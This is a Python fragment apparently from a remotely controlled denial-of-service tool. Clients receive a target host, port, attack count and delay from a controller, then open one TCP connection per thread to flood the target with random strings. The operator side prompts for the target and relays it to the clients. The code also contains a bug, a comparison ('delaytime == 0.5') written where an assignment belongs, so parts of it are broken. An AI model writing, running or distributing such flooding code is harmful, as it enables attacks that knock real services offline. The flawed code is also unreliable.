if isclient == True:
	try:
		import threading
		def thread(new, args=[]):
			if args == []:
				threading.Thread(target=new).start()
			else:
				threading.Thread(target=new, args=args).start()
		addressd = receive(server).decode('utf-8')
		host = addressd.split(':')[0]
		port = addressd.split(':')[1].split()[0]
		attacks = addressd.split(':')[1].split()[1]
		if len(addressd.split(':')[1].split()) == 3:
			try:
				delaytime = int(addressd.split(':')[1].split()[2])
			except:
				delaytime = 0.5
		else:
			delaytime == 0.5
		attacks = int(attacks)
		port = int(port)
		def runAttack(host, port, delaytime):
			def generate_request_id():
				chars = 'abcdefghijklmnopqrstuvwxyz'
				return ''.join(random.choice(chars) for x in range(32))
			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.connect((host, port))
				s.send(generate_request_id().encode('utf-8'))
				time.sleep(delaytime)
				s.close()
			except:
				pass
		for i in range(attacks):
			thread(runAttack, [host, port, delaytime])
	except:
		pass
else:
	addressd = input('ip:port <amount of attacks> (delay till disconnect)> ')
	send(client, addressd.encode('utf-8'))